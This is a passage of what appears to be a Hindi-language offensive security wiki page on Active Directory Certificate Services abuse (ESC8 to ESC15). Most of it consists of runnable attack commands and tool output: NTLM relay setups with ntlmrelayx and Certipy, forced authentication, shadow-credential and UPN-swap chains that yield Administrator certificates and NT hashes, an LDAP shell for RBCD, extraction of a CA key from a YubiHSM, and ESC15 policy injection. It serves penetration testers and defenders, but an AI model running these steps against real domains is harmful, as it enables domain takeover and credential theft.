- **web enrollment interface** (एक पुराना ASP application जो `http://<caserver>/certsrv/` पर उपलब्ध है), default रूप से केवल HTTP पर चलता है, जो NTLM relay attacks के खिलाफ कोई सुरक्षा प्रदान नहीं करता। इसके अलावा, यह स्पष्ट रूप से Authorization HTTP header के माध्यम से केवल NTLM authentication की अनुमति देता है, जिससे Kerberos जैसे अधिक secure authentication methods लागू नहीं होते।
- **Certificate Enrollment Service** (CES), **Certificate Enrollment Policy** (CEP) Web Service, और **Network Device Enrollment Service** (NDES) default रूप से अपनी Authorization HTTP header के माध्यम से negotiate authentication का समर्थन करते हैं। Negotiate authentication Kerberos और **NTLM** दोनों का समर्थन करता है, जिससे attacker relay attacks के दौरान authentication को **NTLM** में downgrade कर सकता है। हालांकि ये web services default रूप से HTTPS सक्षम करते हैं, केवल HTTPS itself **NTLM relay attacks** से सुरक्षा प्रदान नहीं करता। HTTPS services के लिए NTLM relay attacks से सुरक्षा तब ही संभव है जब HTTPS channel binding के साथ संयोजन में हो। अफसोस की बात है कि AD CS IIS पर Extended Protection for Authentication को सक्रिय नहीं करता, जो channel binding के लिए आवश्यक है।

NTLM relay attacks के साथ एक सामान्य **issue** NTLM sessions की **छोटी अवधि** और attacker की उस सेवा के साथ इंटरैक्ट न कर पाने की क्षमता है जो **NTLM signing** की मांग करती हैं।

फिर भी, इस limitation को तब पार किया जा सकता है जब NTLM relay attack का उपयोग करके user के लिए certificate हासिल किया जाए, क्योंकि certificate की validity period session की अवधि निर्धारित करती है, और certificate उन सेवाओं के साथ उपयोग किया जा सकता है जो **NTLM signing** अनिवार्य करती हैं। चोरी किए गए certificate का उपयोग करने के निर्देशों के लिए देखें:

{{#ref}}
account-persistence.md
{{#endref}}

NTLM relay attacks की एक और limitation यह है कि **attacker-controlled मशीन को victim account द्वारा authenticate किया जाना चाहिए**। attacker या तो इंतज़ार कर सकता है या इस authentication को **force** करने का प्रयास कर सकता है:

{{#ref}}
../printers-spooler-service-abuse.md
{{#endref}}

### **Abuse**

[**Certify**](https://github.com/GhostPack/Certify)’s `cas` enumerates **enabled HTTP AD CS endpoints**:
```
Certify.exe cas
```
<figure><img src="../../../images/image (72).png" alt=""><figcaption></figcaption></figure>

`msPKI-Enrollment-Servers` प्रॉपर्टी का उपयोग एंटरप्राइज़ Certificate Authorities (CAs) द्वारा Certificate Enrollment Service (CES) endpoints को स्टोर करने के लिए किया जाता है। इन endpoints को टूल **Certutil.exe** का उपयोग करके पार्स और सूचीबद्ध किया जा सकता है:
```
certutil.exe -enrollmentServerURL -config DC01.DOMAIN.LOCAL\DOMAIN-CA
```
<figure><img src="../../../images/image (757).png" alt=""><figcaption></figcaption></figure>
```bash
Import-Module PSPKI
Get-CertificationAuthority | select Name,Enroll* | Format-List *
```
<figure><img src="../../../images/image (940).png" alt=""><figcaption></figcaption></figure>

#### Abuse with Certify
```bash
## In the victim machine
# Prepare to send traffic to the compromised machine 445 port to 445 in the attackers machine
PortBender redirect 445 8445
rportfwd 8445 127.0.0.1 445
# Prepare a proxy that the attacker can use
socks 1080

## In the attackers
proxychains ntlmrelayx.py -t http://<AC Server IP>/certsrv/certfnsh.asp -smb2support --adcs --no-http-server

# Force authentication from victim to compromised machine with port forwards
execute-assembly C:\SpoolSample\SpoolSample\bin\Debug\SpoolSample.exe <victim> <compromised>
```
#### [Certipy](https://github.com/ly4k/Certipy) के साथ दुरुपयोग

डिफ़ॉल्ट रूप से Certipy सर्टिफिकेट के अनुरोध के लिए उस टेम्पलेट का उपयोग करता है जो `Machine` या `User` होता है — यह इस बात पर निर्भर करता है कि रिलेड किए जा रहे अकाउंट का नाम `$` पर समाप्त होता है या नहीं।  

एक वैकल्पिक टेम्पलेट को `-template` पैरामीटर के उपयोग से निर्दिष्ट किया जा सकता है।

[PetitPotam](https://github.com/ly4k/PetitPotam) जैसी तकनीक का फिर प्रमाणीकरण को जबरदस्ती कराने के लिए उपयोग किया जा सकता है। डोमेन कंट्रोलर्स के मामले में, `-template DomainController` निर्दिष्ट करना आवश्यक है।
```bash
certipy relay -ca ca.corp.local
Certipy v4.0.0 - by Oliver Lyak (ly4k)

[*] Targeting http://ca.corp.local/certsrv/certfnsh.asp
[*] Listening on 0.0.0.0:445
[*] Requesting certificate for 'CORP\\Administrator' based on the template 'User'
[*] Got certificate with UPN 'Administrator@corp.local'
[*] Certificate object SID is 'S-1-5-21-980154951-4172460254-2779440654-500'
[*] Saved certificate and private key to 'administrator.pfx'
[*] Exiting...
```
## कोई सुरक्षा एक्सटेंशन - ESC9 <a href="#id-5485" id="id-5485"></a>

### व्याख्या

नया मान **`CT_FLAG_NO_SECURITY_EXTENSION`** (`0x80000`) जो **`msPKI-Enrollment-Flag`** के लिए है, जिसे ESC9 कहा जाता है, प्रमाणपत्र में नए `szOID_NTDS_CA_SECURITY_EXT` security extension को एम्बेड होने से रोकता है। यह फ़्लैग तब प्रासंगिक हो जाता है जब `StrongCertificateBindingEnforcement` को `1` (डिफ़ॉल्ट सेटिंग) पर सेट किया गया हो, जो कि `2` की सेटिंग से विपरीत है। इसका महत्व उन परिदृश्यों में बढ़ जाता है जहाँ Kerberos या Schannel के लिए कमजोर certificate mapping का दुरुपयोग किया जा सकता है (जैसा कि ESC10 में है), क्योंकि ESC9 की अनुपस्थिति आवश्यकताओं को बदलती नहीं।

उससे जुड़े परिस्थितियाँ जिनमें इस फ्लैग की सेटिंग महत्वपूर्ण हो जाती है, शामिल हैं:

- `StrongCertificateBindingEnforcement` को `2` पर समायोजित नहीं किया गया है (डिफ़ॉल्ट `1` है), या `CertificateMappingMethods` में `UPN` फ्लैग शामिल है।
- प्रमाणपत्र को `msPKI-Enrollment-Flag` सेटिंग में `CT_FLAG_NO_SECURITY_EXTENSION` फ़्लैग के साथ चिह्नित किया गया है।
- किसी भी client authentication EKU को प्रमाणपत्र द्वारा निर्दिष्ट किया गया है।
- किसी खाते पर किसी अन्य खाते को समझौता करने के लिए `GenericWrite` अनुमतियाँ उपलब्ध हैं।

### दुरुपयोग परिदृश्य

मान लीजिए `John@corp.local` के पास `Jane@corp.local` पर `GenericWrite` अनुमतियाँ हैं, और उद्देश्य `Administrator@corp.local` को समझौता करना है। `ESC9` certificate template, जिसमें `Jane@corp.local` को enroll करने की अनुमति है, को इसके `msPKI-Enrollment-Flag` सेटिंग में `CT_FLAG_NO_SECURITY_EXTENSION` फ़्लैग के साथ कॉन्फ़िगर किया गया है।

प्रारम्भ में, `Jane` का hash `Shadow Credentials` का उपयोग करके प्राप्त किया जाता है, जो `John` की `GenericWrite` के कारण संभव हुआ:
```bash
certipy shadow auto -username John@corp.local -password Passw0rd! -account Jane
```
उसके बाद, `Jane` का `userPrincipalName` जानबूझकर `@corp.local` डोमेन भाग को छोड़ते हुए `Administrator` में संशोधित किया गया:
```bash
certipy account update -username John@corp.local -password Passw0rd! -user Jane -upn Administrator
```
यह संशोधन प्रतिबंधों का उल्लंघन नहीं करता, क्योंकि `Administrator@corp.local` `Administrator` के `userPrincipalName` के रूप में अलग बना रहता है।

इसके बाद, `ESC9` प्रमाणपत्र टेम्पलेट, जिसे vulnerable के रूप में चिह्नित किया गया था, `Jane` के रूप में अनुरोध किया गया:
```bash
certipy req -username jane@corp.local -hashes <hash> -ca corp-DC-CA -template ESC9
```
ध्यान दें कि प्रमाणपत्र का `userPrincipalName` `Administrator` दिखा रहा है, और इसमें कोई “object SID” नहीं है।

`Jane` का `userPrincipalName` फिर उसकी मूल, `Jane@corp.local`, पर वापस कर दिया जाता है:
```bash
certipy account update -username John@corp.local -password Passw0rd! -user Jane -upn Jane@corp.local
```
इश्यू किए गए प्रमाणपत्र के साथ प्रमाणीकरण का प्रयास अब `Administrator@corp.local` का NT hash देता है। प्रमाणपत्र में domain निर्दिष्ट न होने के कारण कमांड में `-domain <domain>` शामिल होना चाहिए:
```bash
certipy auth -pfx adminitrator.pfx -domain corp.local
```
## Weak Certificate Mappings - ESC10

### व्याख्या

डोमेन कंट्रोलर पर दो रजिस्ट्री कुंजी मान ESC10 द्वारा संदर्भित हैं:

- `HKEY_LOCAL_MACHINE\System\CurrentControlSet\Control\SecurityProviders\Schannel` के अंतर्गत `CertificateMappingMethods` का डिफ़ॉल्ट मान `0x18` (`0x8 | 0x10`) है, पहले यह `0x1F` पर सेट था।
- `HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Services\Kdc` के अंतर्गत `StrongCertificateBindingEnforcement` की डिफ़ॉल्ट सेटिंग `1` है, पहले `0` थी।

**Case 1**

जब `StrongCertificateBindingEnforcement` को `0` पर कॉन्फ़िगर किया गया हो।

**Case 2**

यदि `CertificateMappingMethods` में `UPN` बिट (`0x4`) शामिल है।

### दुरुपयोग मामला 1

जब `StrongCertificateBindingEnforcement` को `0` पर कॉन्फ़िगर किया गया हो, तो `GenericWrite` permissions वाला खाता A किसी भी खाते B को समझौता करने के लिए शोषित किया जा सकता है।

उदाहरण के लिए, यदि `Jane@corp.local` पर `GenericWrite` permissions हैं, तो एक हमलावर `Administrator@corp.local` को समझौता करने का लक्ष्य रख सकता है। प्रक्रिया ESC9 की तरह है, जिससे कोई भी certificate template उपयोग किया जा सकता है।

प्रारंभ में, `Jane` का hash Shadow Credentials का उपयोग करके प्राप्त किया जाता है, `GenericWrite` का दुरुपयोग करते हुए।
```bash
certipy shadow autho -username John@corp.local -p Passw0rd! -a Jane
```
इसके बाद, `Jane` का `userPrincipalName` `Administrator` में बदल दिया गया, जानबूझकर `@corp.local` भाग को छोड़कर ताकि किसी प्रतिबंध उल्लंघन से बचा जा सके।
```bash
certipy account update -username John@corp.local -password Passw0rd! -user Jane -upn Administrator
```
इसके बाद, डिफ़ॉल्ट `User` टेम्पलेट का उपयोग करते हुए `Jane` के लिए क्लाइंट प्रमाणन सक्षम करने वाला एक प्रमाणपत्र अनुरोध किया जाता है।
```bash
certipy req -ca 'corp-DC-CA' -username Jane@corp.local -hashes <hash>
```
`Jane` के `userPrincipalName` को फिर इसकी मूल, `Jane@corp.local`, पर पुनर्स्थापित कर दिया जाता है।
```bash
certipy account update -username John@corp.local -password Passw0rd! -user Jane -upn Jane@corp.local
```
प्राप्त प्रमाणपत्र के साथ प्रमाणीकृत करने पर `Administrator@corp.local` का NT hash प्राप्त होगा; चूंकि प्रमाणपत्र में डोमेन विवरण शामिल नहीं होते, इसलिए कमांड में डोमेन निर्दिष्ट करना आवश्यक होगा।
```bash
certipy auth -pfx administrator.pfx -domain corp.local
```
### दुरुपयोग केस 2

`CertificateMappingMethods` में `UPN` बिट फ्लैग (`0x4`) होने पर, `GenericWrite` permissions वाला खाता A किसी भी खाता B को compromise कर सकता है जिसके पास `userPrincipalName` property नहीं है, जिसमें मशीन खाते और built-in domain administrator `Administrator` शामिल हैं।

यहाँ लक्ष्य `DC$@corp.local` को compromise करना है, शुरुआत `GenericWrite` का उपयोग करते हुए Shadow Credentials के माध्यम से `Jane` का hash प्राप्त करने से होगी।
```bash
certipy shadow auto -username John@corp.local -p Passw0rd! -account Jane
```
`Jane` का `userPrincipalName` फिर `DC$@corp.local` पर सेट किया जाता है।
```bash
certipy account update -username John@corp.local -password Passw0rd! -user Jane -upn 'DC$@corp.local'
```
डिफ़ॉल्ट `User` टेम्पलेट का उपयोग करके क्लाइंट प्रमाणीकरण के लिए `Jane` के रूप में एक प्रमाणपत्र अनुरोध किया गया है.
```bash
certipy req -ca 'corp-DC-CA' -username Jane@corp.local -hashes <hash>
```
`Jane` का `userPrincipalName` इस प्रक्रिया के बाद अपनी मूल स्थिति में लौट आता है।
```bash
certipy account update -username John@corp.local -password Passw0rd! -user Jane -upn 'Jane@corp.local'
```
Schannel के माध्यम से प्रमाणीकृत करने के लिए, Certipy का `-ldap-shell` विकल्प उपयोग किया जाता है, जो प्रमाणीकरण की सफलता को `u:CORP\DC$` के रूप में दर्शाता है।
```bash
certipy auth -pfx dc.pfx -dc-ip 172.16.126.128 -ldap-shell
```
LDAP shell के माध्यम से, `set_rbcd` जैसे commands Resource-Based Constrained Delegation (RBCD) attacks को सक्षम करते हैं, जो संभावित रूप से domain controller को compromise कर सकते हैं।
```bash
certipy auth -pfx dc.pfx -dc-ip 172.16.126.128 -ldap-shell
```
यह भेद्यता उन किसी भी user account तक भी फैलती है जिनमें `userPrincipalName` नहीं है या जहाँ यह `sAMAccountName` से मेल नहीं खाता, और डिफ़ॉल्ट `Administrator@corp.local` एक प्रमुख लक्ष्य होता है क्योंकि उसके पास उच्च LDAP privileges होते हैं और डिफ़ॉल्ट रूप से `userPrincipalName` का अभाव होता है।

## NTLM को ICPR पर रिले करना - ESC11

### व्याख्या

यदि CA Server `IF_ENFORCEENCRYPTICERTREQUEST` के साथ कॉन्फ़िगर नहीं है, तो यह RPC service के माध्यम से साइनिंग के बिना NTLM relay attacks की अनुमति दे सकता है। [Reference in here](https://blog.compass-security.com/2022/11/relaying-to-ad-certificate-services-over-rpc/).

आप `certipy` का उपयोग यह जाँचने के लिए कर सकते हैं कि `Enforce Encryption for Requests` Disabled है या नहीं, और certipy `ESC11` Vulnerabilities दिखाएगा।
```bash
$ certipy find -u mane@domain.local -p 'password' -dc-ip 192.168.100.100 -stdout
Certipy v4.0.0 - by Oliver Lyak (ly4k)

Certificate Authorities
0
CA Name                             : DC01-CA
DNS Name                            : DC01.domain.local
Certificate Subject                 : CN=DC01-CA, DC=domain, DC=local
....
Enforce Encryption for Requests     : Disabled
....
[!] Vulnerabilities
ESC11                             : Encryption is not enforced for ICPR requests and Request Disposition is set to Issue

```
### दुरुपयोग परिदृश्य

एक relay server सेटअप करने की आवश्यकता है:
```bash
$ certipy relay -target 'rpc://DC01.domain.local' -ca 'DC01-CA' -dc-ip 192.168.100.100
Certipy v4.7.0 - by Oliver Lyak (ly4k)

[*] Targeting rpc://DC01.domain.local (ESC11)
[*] Listening on 0.0.0.0:445
[*] Connecting to ncacn_ip_tcp:DC01.domain.local[135] to determine ICPR stringbinding
[*] Attacking user 'Administrator@DOMAIN'
[*] Template was not defined. Defaulting to Machine/User
[*] Requesting certificate for user 'Administrator' with template 'User'
[*] Requesting certificate via RPC
[*] Successfully requested certificate
[*] Request ID is 10
[*] Got certificate with UPN 'Administrator@domain.local'
[*] Certificate object SID is 'S-1-5-21-1597581903-3066826612-568686062-500'
[*] Saved certificate and private key to 'administrator.pfx'
[*] Exiting...
```
नोट: डोमेन कंट्रोलर्स के लिए, हमें DomainController में `-template` निर्दिष्ट करना होगा।

या [sploutchy's fork of impacket](https://github.com/sploutchy/impacket) का उपयोग करें:
```bash
$ ntlmrelayx.py -t rpc://192.168.100.100 -rpc-mode ICPR -icpr-ca-name DC01-CA -smb2support
```
## Shell access to ADCS CA with YubiHSM - ESC12

### व्याख्या

प्रशासक Certificate Authority को किसी बाहरी डिवाइस जैसे "Yubico YubiHSM2" पर स्टोर करने के लिए सेटअप कर सकते हैं।

यदि USB device CA सर्वर से USB पोर्ट के माध्यम से जुड़ा हो, या CA सर्वर एक virtual machine होने की स्थिति में USB device server द्वारा जुड़ा हो, तो Key Storage Provider को YubiHSM में keys generate और उपयोग करने के लिए एक authentication key (कभी-कभी इसे "password" कहा जाता है) की आवश्यकता होती है।

यह key/password रजिस्ट्री में `HKEY_LOCAL_MACHINE\SOFTWARE\Yubico\YubiHSM\AuthKeysetPassword` के अंतर्गत cleartext में संग्रहीत होता है।

संदर्भ [यहाँ](https://pkiblog.knobloch.info/esc12-shell-access-to-adcs-ca-with-yubihsm).

### दुरुपयोग परिदृश्य

यदि CA की private key किसी physical USB device पर संग्रहीत है और आपको shell access मिल गया है, तो उस key को recover किया जा सकता है।

सबसे पहले, आपको CA certificate प्राप्त करना होगा (यह public है) और फिर:
```cmd
# import it to the user store with CA certificate
$ certutil -addstore -user my <CA certificate file>

# Associated with the private key in the YubiHSM2 device
$ certutil -csp "YubiHSM Key Storage Provider" -repairstore -user my <CA Common Name>
```
अंत में, CA प्रमाणपत्र और उसकी private key का उपयोग करके एक नया arbitrary certificate बनाने के लिए certutil `-sign` कमांड का उपयोग करें।

## OID Group Link Abuse - ESC13

### व्याख्या

`msPKI-Certificate-Policy` attribute प्रमाणपत्र टेम्पलेट में issuance policy जोड़ने की अनुमति देता है। जो `msPKI-Enterprise-Oid` objects policy जारी करने के लिए जिम्मेदार हैं वे PKI OID container के Configuration Naming Context (CN=OID,CN=Public Key Services,CN=Services) में खोजे जा सकते हैं। किसी policy को इस object's `msDS-OIDToGroupLink` attribute का उपयोग करके किसी AD group से जोड़ा जा सकता है, जिससे सिस्टम उस उपयोगकर्ता को authorize कर सकता है जो प्रमाणपत्र प्रस्तुत करता है मानो वह समूह का सदस्य हो। [Reference in here](https://posts.specterops.io/adcs-esc13-abuse-technique-fda4272fbd53).

दूसरे शब्दों में, जब किसी उपयोगकर्ता के पास certificate enroll करने की permission होती है और certificate किसी OID group से linked होता है, तो वह उपयोगकर्ता इस group के privileges inherit कर सकता है।

OIDToGroupLink खोजने के लिए [Check-ADCSESC13.ps1](https://github.com/JonasBK/Powershell/blob/master/Check-ADCSESC13.ps1) का उपयोग करें:
```bash
Enumerating OIDs
------------------------
OID 23541150.FCB720D24BC82FBD1A33CB406A14094D links to group: CN=VulnerableGroup,CN=Users,DC=domain,DC=local

OID DisplayName: 1.3.6.1.4.1.311.21.8.3025710.4393146.2181807.13924342.9568199.8.4253412.23541150
OID DistinguishedName: CN=23541150.FCB720D24BC82FBD1A33CB406A14094D,CN=OID,CN=Public Key Services,CN=Services,CN=Configuration,DC=domain,DC=local
OID msPKI-Cert-Template-OID: 1.3.6.1.4.1.311.21.8.3025710.4393146.2181807.13924342.9568199.8.4253412.23541150
OID msDS-OIDToGroupLink: CN=VulnerableGroup,CN=Users,DC=domain,DC=local
------------------------
Enumerating certificate templates
------------------------
Certificate template VulnerableTemplate may be used to obtain membership of CN=VulnerableGroup,CN=Users,DC=domain,DC=local

Certificate template Name: VulnerableTemplate
OID DisplayName: 1.3.6.1.4.1.311.21.8.3025710.4393146.2181807.13924342.9568199.8.4253412.23541150
OID DistinguishedName: CN=23541150.FCB720D24BC82FBD1A33CB406A14094D,CN=OID,CN=Public Key Services,CN=Services,CN=Configuration,DC=domain,DC=local
OID msPKI-Cert-Template-OID: 1.3.6.1.4.1.311.21.8.3025710.4393146.2181807.13924342.9568199.8.4253412.23541150
OID msDS-OIDToGroupLink: CN=VulnerableGroup,CN=Users,DC=domain,DC=local
------------------------
```
### दुरुपयोग परिदृश्य

ऐसी उपयोगकर्ता अनुमति ढूँढें जिसका उपयोग किया जा सके `certipy find` या `Certify.exe find /showAllPermissions`।

यदि `John` के पास `VulnerableTemplate` में enroll करने की अनुमति है, तो वह उपयोगकर्ता `VulnerableGroup` समूह के अधिकार विरासत में पा सकता है।

उसे बस template निर्दिष्ट करना होगा; उसे OIDToGroupLink rights के साथ एक certificate मिल जाएगा।
```bash
certipy req -u "John@domain.local" -p "password" -dc-ip 192.168.100.100 -target "DC01.domain.local" -ca 'DC01-CA' -template 'VulnerableTemplate'
```
## कमजोर प्रमाणपत्र नवीनीकरण कॉन्फ़िगरेशन - ESC14

### व्याख्या

The description at https://github.com/ly4k/Certipy/wiki/06-%E2%80%90-Privilege-Escalation#esc14-weak-explicit-certificate-mapping is remarkably thorough. नीचे मूल पाठ का उद्धरण दिया गया है।

ESC14 उन कमजोरियों को संबोधित करता है जो "weak explicit certificate mapping" से उत्पन्न होती हैं, मुख्यतः Active Directory उपयोगकर्ता या कंप्यूटर खातों पर `altSecurityIdentities` एट्रिब्यूट के दुरुपयोग या असुरक्षित कॉन्फ़िगरेशन के माध्यम से। यह बहु-मूल्य वाला एट्रिब्यूट व्यवस्थापकों को X.509 प्रमाणपत्रों को प्रमाणीकरण के प्रयोजनों के लिए एक AD खाते के साथ मैन्युअल रूप से जोड़ने की अनुमति देता है। जब यह भरा होता है, तो ये explicit mappings डिफ़ॉल्ट प्रमाणपत्र मैपिंग लॉजिक को ओवरराइड कर सकते हैं, जो आम तौर पर SAN में UPNs या DNS नामों पर निर्भर करता है, या `szOID_NTDS_CA_SECURITY_EXT` सुरक्षा एक्सटेंशन में एम्बेडेड SID पर।

एक "कमज़ोर" मैपिंग तब होती है जब `altSecurityIdentities` एट्रिब्यूट के भीतर उपयोग किया गया स्ट्रिंग मान किसी प्रमाणपत्र की पहचान करने के लिए बहुत व्यापक, आसानी से अनुमान लगाने योग्य, गैर-विशिष्ट प्रमाणपत्र फ़ील्ड पर निर्भर, या आसानी से स्पूफ किए जाने योग्य प्रमाणपत्र कम्पोनेंट का उपयोग करता है। यदि किसी attacker को ऐसा प्रमाणपत्र प्राप्त करने या बनवाने में सक्षम होने की स्थिति है जिसका attributes ऐसे कमज़ोर तरीके से परिभाषित explicit mapping के साथ मेल खाता है जो किसी privileged खाते के लिए सेट है, तो वे उस खाते के रूप में प्रमाणीकरण करने और उसका impersonate करने के लिए उस प्रमाणपत्र का उपयोग कर सकते हैं।

संभावित रूप से कमजोर `altSecurityIdentities` मैपिंग स्ट्रिंग्स के उदाहरणों में शामिल हैं:

- Mapping solely by a common Subject Common Name (CN): e.g., `X509:<S>CN=SomeUser`. An attacker might be able to obtain a certificate with this CN from a less secure source.
- Using overly generic Issuer Distinguished Names (DNs) or Subject DNs without further qualification like a specific serial number or subject key identifier: e.g., `X509:<I>CN=SomeInternalCA<S>CN=GenericUser`.
- Employing other predictable patterns or non-cryptographic identifiers that an attacker might be able to satisfy in a certificate they can legitimately obtain or forge (if they have compromised a CA or found a vulnerable template like in ESC1).

`altSecurityIdentities` एट्रिब्यूट मैपिंग के लिए विभिन्न फ़ार्मैट्स का समर्थन करता है, जैसे:

- `X509:<I>IssuerDN<S>SubjectDN` (maps by full Issuer and Subject DN)
- `X509:<SKI>SubjectKeyIdentifier` (maps by the certificate's Subject Key Identifier extension value)
- `X509:<SR>SerialNumberBackedByIssuerDN` (maps by serial number, implicitly qualified by the Issuer DN) - this is not a standard format, usually it's `<I>IssuerDN<SR>SerialNumber`.
- `X509:<RFC822>EmailAddress` (maps by an RFC822 name, typically an email address, from the SAN)
- `X509:<SHA1-PUKEY>Thumbprint-of-Raw-PublicKey` (maps by a SHA1 hash of the certificate's raw public key - generally strong)

इन मैपिंग्स की सुरक्षा काफी हद तक चुने गए प्रमाणपत्र पहचानकर्ताओं की विशिष्टता, अनन्यता, और क्रिप्टोग्राफिक मजबूती पर निर्भर करती है। भले ही Domain Controllers पर मजबूत certificate binding modes सक्षम हों (जो मुख्यतः SAN UPNs/DNS और SID एक्सटेंशन पर आधारित implicit mappings को प्रभावित करते हैं), एक गलत तरीके से कॉन्फ़िगर किया गया `altSecurityIdentities` एंट्री तब भी impersonation के लिए सीधे रास्ते प्रदान कर सकती है अगर मैपिंग लॉजिक ही flawed या बहुत permissive हो।

### दुरुपयोग परिदृश्य

ESC14 का लक्ष्य Active Directory (AD) में **explicit certificate mappings** है, विशेष रूप से `altSecurityIdentities` एट्रिब्यूट। यदि यह एट्रिब्यूट सेट किया गया है (डिज़ाइन या misconfiguration के कारण), तो attackers उन प्रमाणपत्रों को प्रस्तुत करके खातों का impersonate कर सकते हैं जो मैपिंग से मेल खाते हैं।

#### Scenario A: Attacker Can Write to `altSecurityIdentities`

**Precondition**: Attacker को लक्ष्य खाते के `altSecurityIdentities` एट्रिब्यूट में लिखने की अनुमति है या लक्ष्य AD ऑब्जेक्ट पर निम्नलिखित अनुमतियों में से किसी एक का अधिकार है:
- Write property `altSecurityIdentities`
- Write property `Public-Information`
- Write property (all)
- `WriteDACL`
- `WriteOwner`*
- `GenericWrite`
- `GenericAll`
- Owner*.

#### Scenario B: Target Has Weak Mapping via X509RFC822 (Email)

- **Precondition**: Target के `altSecurityIdentities` में एक कमजोर X509RFC822 मैपिंग है। एक attacker victim का `mail` एट्रिब्यूट इस X509RFC822 नाम से मिलाने के लिए सेट कर सकता है, victim के रूप में एक प्रमाणपत्र enroll कर सकता है, और इसे target के रूप में authenticate करने के लिए उपयोग कर सकता है।

#### Scenario C: Target Has X509IssuerSubject Mapping

- **Precondition**: Target के `altSecurityIdentities` में एक कमजोर X509IssuerSubject explicit मैपिंग है। Attacker victim principal पर `cn` या `dNSHostName` एट्रिब्यूट को target की X509IssuerSubject मैपिंग के subject से मेल करने के लिए सेट कर सकता है। फिर, attacker victim के रूप में एक प्रमाणपत्र enroll कर सकता है, और इस प्रमाणपत्र का उपयोग target के रूप में authenticate करने के लिए कर सकता है।

#### Scenario D: Target Has X509SubjectOnly Mapping

- **Precondition**: Target के `altSecurityIdentities` में एक कमजोर X509SubjectOnly explicit मैपिंग है। Attacker victim principal पर `cn` या `dNSHostName` एट्रिब्यूट को target की X509SubjectOnly मैपिंग के subject से मेल करने के लिए सेट कर सकता है। फिर, attacker victim के रूप में एक प्रमाणपत्र enroll कर सकता है, और इस प्रमाणपत्र का उपयोग target के रूप में authenticate करने के लिए कर सकता है।

### ठोस संचालन
#### परिदृश्य A

सर्टिफिकेट टेम्पलेट `Machine` का प्रमाणपत्र अनुरोध करें।
```bash
.\Certify.exe request /ca:<ca> /template:Machine /machine
```
प्रमाणपत्र सहेजें और रूपांतरित करें
```bash
certutil -MergePFX .\esc13.pem .\esc13.pfx
```
प्रमाणीकृत करें (सर्टिफिकेट का उपयोग करके)
```bash
.\Rubeus.exe asktgt /user:<user> /certificate:C:\esc13.pfx /nowrap
```
सफाई (वैकल्पिक)
```bash
Remove-AltSecIDMapping -DistinguishedName "CN=TargetUserA,CN=Users,DC=external,DC=local" -MappingString "X509:<I>DC=local,DC=external,CN=external-EXTCA01-CA<SR>250000000000a5e838c6db04f959250000006c"
```
For more specific attack methods in various attack scenarios, please refer to the following: [adcs-esc14-abuse-technique](https://posts.specterops.io/adcs-esc14-abuse-technique-333a004dc2b9#aca0).

## EKUwu Application Policies(CVE-2024-49019) - ESC15

### स्पष्टीकरण

https://trustedsec.com/blog/ekuwu-not-just-another-ad-cs-esc पर दिया गया विवरण काफी विस्तृत है। नीचे मूल पाठ का उद्धरण दिया गया है।

Using built-in default version 1 certificate templates, an attacker can craft a CSR to include application policies that are preferred over the configured Extended Key Usage attributes specified in the template. The only requirement is enrollment rights, and it can be used to generate client authentication, certificate request agent, and codesigning certificates using the **_WebServer_** template

### दुरुपयोग

The following is referenced to [this link]((https://github.com/ly4k/Certipy/wiki/06-%E2%80%90-Privilege-Escalation#esc15-arbitrary-application-policy-injection-in-v1-templates-cve-2024-49019-ekuwu),विस्तृत उपयोग विधियाँ देखने के लिए क्लिक करें।

Certipy का `find` कमांड unpatched CA की स्थिति में संभावित रूप से ESC15 के प्रति संवेदनशील V1 templates की पहचान करने में मदद कर सकता है।
```bash
certipy find -username cccc@aaa.htb -password aaaaaa -dc-ip 10.0.0.100
```
#### Scenario A: Schannel के माध्यम से Direct Impersonation

**Step 1: एक सर्टिफिकेट अनुरोध करें, "Client Authentication" Application Policy और लक्षित UPN इंजेक्ट करते हुए।** अटैकर `attacker@corp.local` `administrator@corp.local` को "WebServer" V1 टेम्पलेट का उपयोग करके लक्षित करता है (जो enrollee-supplied subject की अनुमति देता है)।
```bash
certipy req \
-u 'attacker@corp.local' -p 'Passw0rd!' \
-dc-ip '10.0.0.100' -target 'CA.CORP.LOCAL' \
-ca 'CORP-CA' -template 'WebServer' \
-upn 'administrator@corp.local' -sid 'S-1-5-21-...-500' \
-application-policies 'Client Authentication'
```
- `-template 'WebServer'`: कमजोर V1 टेम्पलेट जिसमें "Enrollee supplies subject" है।
- `-application-policies 'Client Authentication'`: CSR के Application Policies एक्सटेंशन में OID `1.3.6.1.5.5.7.3.2` इंजेक्ट करता है।
- `-upn 'administrator@corp.local'`: SAN में UPN सेट करता है ताकि पहचान की नकल के लिए किया जा सके।

**चरण 2: प्राप्त सर्टिफिकेट का उपयोग करके Schannel (LDAPS) के माध्यम से प्रमाणीकृत करें।**
```bash
certipy auth -pfx 'administrator.pfx' -dc-ip '10.0.0.100' -ldap-shell
```
#### परिदृश्य B: PKINIT/Kerberos Impersonation via Enrollment Agent Abuse

**चरण 1: V1 template से एक प्रमाणपत्र का अनुरोध करें (जिसमें "Enrollee supplies subject" हो), और "Certificate Request Agent" Application Policy इंजेक्ट करें।** यह प्रमाणपत्र attacker (`attacker@corp.local`) के लिए है ताकि वह एक enrollment agent बन सके। यहाँ attacker की अपनी UPN निर्दिष्ट नहीं की गई है, क्योंकि उद्देश्य enrollment agent बनने की क्षमता प्राप्त करना है।
```bash
certipy req \
-u 'attacker@corp.local' -p 'Passw0rd!' \
-dc-ip '10.0.0.100' -target 'CA.CORP.LOCAL' \
-ca 'CORP-CA' -template 'WebServer' \
-application-policies 'Certificate Request Agent'
```
- `-application-policies 'Certificate Request Agent'`: OID `1.3.6.1.4.1.311.20.2.1` को इंजेक्ट करता है.

**चरण 2: "agent" सर्टिफिकेट का उपयोग किसी लक्षित विशेषाधिकार प्राप्त उपयोगकर्ता की ओर से सर्टिफिकेट अनुरोध करने के लिए करें।** यह एक ESC3-like चरण है, जिसमें चरण 1 से सर्टिफिकेट को agent सर्टिफिकेट के रूप में उपयोग किया जा रहा है.
```bash
certipy req \
-u 'attacker@corp.local' -p 'Passw0rd!' \
-dc-ip '10.0.0.100' -target 'CA.CORP.LOCAL' \
-ca 'CORP-CA' -template 'User' \
-pfx 'attacker.pfx' -on-behalf-of 'CORP\Administrator'
```
**चरण 3: "on-behalf-of" प्रमाणपत्र का उपयोग करके विशेषाधिकार प्राप्त उपयोगकर्ता के रूप में प्रमाणीकरण करें।**
```bash
certipy auth -pfx 'administrator.pfx' -dc-ip '10.0.0.100'
```
## CA पर Security Extension अक्षम (वैश्विक)-ESC16

### व्याख्या

